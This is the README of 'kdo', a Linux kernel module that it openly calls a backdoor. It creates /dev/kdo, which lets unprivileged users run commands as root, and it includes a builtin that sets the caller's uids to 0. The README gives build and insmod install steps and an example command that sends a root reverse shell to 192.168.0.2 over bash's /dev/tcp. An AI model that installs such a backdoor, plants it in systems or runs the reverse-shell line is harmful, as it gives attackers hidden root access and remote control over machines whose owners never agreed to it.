kdo
===
Kernel-level sudo. This is a very simple LKM that creates a character device at `/dev/kdo` to which
commands can be written and executed via `call_usermodehelper`, effectively creating a backdoor for
unprivileged users. Apart from privilege execution, some useful builtins are implemented as well.


Builtins
--------
- `kdo-su` \
Grant root privileges to the current process (set all uids to 0).


Installation
------------
**1**. Clone the repository
```bash
git clone https://github.com/hiatus/kdo
```

**2**. Build the module
```bash
cd kdo
make
```

**3**. Insert the module 
```
sudo insmod kdo.ko
```


Usage
-----
Simply write to `/dev/kdo`. Because the module treats anything (apart from builtins) as a last
argument for `/bin/sh -i -c`, redirection and other shell functionalities are supported. For
example, to send a root reverse shell to `192.168.0.2:12345`, run:
```bash
echo 'bash -i &> /dev/tcp/192.168.0.2/12345 0>&1' > /dev/kdo
```
